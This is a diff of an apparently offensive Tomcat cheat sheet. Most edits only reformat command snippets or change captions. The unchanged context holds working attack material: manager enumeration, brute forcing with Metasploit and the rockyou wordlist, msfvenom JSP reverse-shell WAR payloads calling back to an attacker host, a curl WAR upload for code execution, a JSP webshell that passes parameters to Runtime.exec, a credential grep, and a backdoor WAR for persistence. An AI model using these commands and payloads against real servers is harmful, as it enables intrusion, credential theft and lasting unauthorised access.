@@ -3,7 +3,7 @@ id: "reqxrnjdqmptlvcse"
 title: "tomcat"
 description: ""
 tags: []
-order: 18
+order: "18"
 createdAt: "2026-05-31T09:57:02.462Z"
 updatedAt: "2026-05-31T09:57:15.703Z"
 ---
@@ -100,7 +100,7 @@ for path in /manager/html /manager/text /manager/jmxproxy /host-manager/html /ad
 
 ### b2y8nw09xmptlvjx1
 ```bash
-  code=$(curl -so /dev/null -w "%{http_code}" http://$TARGET:8080$path)
+code=$(curl -so /dev/null -w "%{http_code}" http://$TARGET:8080$path)
 ```
 
 **Tags:** tomcat, manager, enumeration, discovery
@@ -108,7 +108,7 @@ for path in /manager/html /manager/text /manager/jmxproxy /host-manager/html /ad
 
 ### q6cfnvz8zmptlvjx6
 ```bash
-  echo "$code $path"
+echo "$code $path"
 ```
 
 **Tags:** tomcat, manager, enumeration, discovery
@@ -137,7 +137,7 @@ _Brute Force Manager Credentials_
 
 ### g09f7024imptlvjxt
 ```bash
-  http-get://$TARGET:8080/manager/html
+http-get://$TARGET:8080/manager/html
 ```
 
 **Tags:** tomcat, bruteforce, hydra, metasploit
@@ -147,6 +147,8 @@ _Brute Force Manager Credentials_
 ```bash
 use auxiliary/scanner/http/tomcat_mgr_login
 ```
+
+_mgr_
 
 **Tags:** tomcat, bruteforce, hydra, metasploit
 <!-- cmd: {"id":"kcygw3wv2mptlvjxy","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->
@@ -215,7 +217,7 @@ netexec http $TARGET -p 8080 -u tomcat -p /usr/share/wordlists/rockyou.txt --pat
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
 ```
 
-_RCE via Manager — WAR Deployment Deploy malicious WAR file through Tomcat Manager._
+_shell_
 
 **Tags:** tomcat, war, rce, exploitation, manager
 <!-- cmd: {"id":"ydt5ewe79mptlvjzf","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->
@@ -246,7 +248,7 @@ curl -u $USER:$PASS http://$TARGET:8080/manager/html/upload \
 
 ### oahgnriyamptlvk00
 ```bash
-  -F "file=@shell.war;type=application/octet-stream"
+-F "file=@shell.war;type=application/octet-stream"
 ```
 
 **Tags:** tomcat, war, rce, exploitation, manager
@@ -256,6 +258,8 @@ curl -u $USER:$PASS http://$TARGET:8080/manager/html/upload \
 ```bash
 use exploit/multi/http/tomcat_mgr_upload
 ```
+
+_mgr_
 
 **Tags:** tomcat, war, rce, exploitation, manager
 <!-- cmd: {"id":"pcfex4q4kmptlvk05","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->
@@ -461,7 +465,7 @@ _JSP Webshell_
 
 ### tnbo5wvmdmptlvk42
 ```bash
-  String cmd = request.getParameter("cmd");
+String cmd = request.getParameter("cmd");
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -469,7 +473,7 @@ _JSP Webshell_
 
 ### u9xhtyrg0mptlvk46
 ```bash
-  Process p = Runtime.getRuntime().exec(cmd);
+Process p = Runtime.getRuntime().exec(cmd);
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -477,7 +481,7 @@ _JSP Webshell_
 
 ### n8f73852smptlvk4b
 ```bash
-  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -485,7 +489,7 @@ _JSP Webshell_
 
 ### 1lfv2hx37mptlvk4f
 ```bash
-  String line;
+String line;
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -493,7 +497,7 @@ _JSP Webshell_
 
 ### 68in41351mptlvk4l
 ```bash
-  while((line=br.readLine())!=null) out.println(line + "<br>");
+while((line=br.readLine())!=null) out.println(line + "<br>");
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -549,7 +553,7 @@ cat > wardir/WEB-INF/web.xml << 'EOF'
 
 ### bq1n77ehymptlvk5i
 ```bash
-  <servlet><servlet-name>s</servlet-name><servlet-class>org.apache.jsp.shell_jsp</servlet-class></servlet>
+<servlet><servlet-name>s</servlet-name><servlet-class>org.apache.jsp.shell_jsp</servlet-class></servlet>
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -557,7 +561,7 @@ cat > wardir/WEB-INF/web.xml << 'EOF'
 
 ### hb4djyo9vmptlvk5n
 ```bash
-  <servlet-mapping><servlet-name>s</servlet-name><url-pattern>/shell.jsp</url-pattern></servlet-mapping>
+<servlet-mapping><servlet-name>s</servlet-name><url-pattern>/shell.jsp</url-pattern></servlet-mapping>
 ```
 
 **Tags:** tomcat, webshell, jsp, exploitation
@@ -786,7 +790,7 @@ grep -r "password\|username\|secret\|connectionString" /opt/tomcat/ 2>/dev/null
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o backdoor.war
 ```
 
-_Persistence_
+_shell_
 
 **Tags:** tomcat, persistence, backdoor
 <!-- cmd: {"id":"uoaoczkw3mptlvkap","language":"bash","sectionId":"vgcvvta6tmptlvjur","tags":["tomcat","persistence","backdoor"]} -->
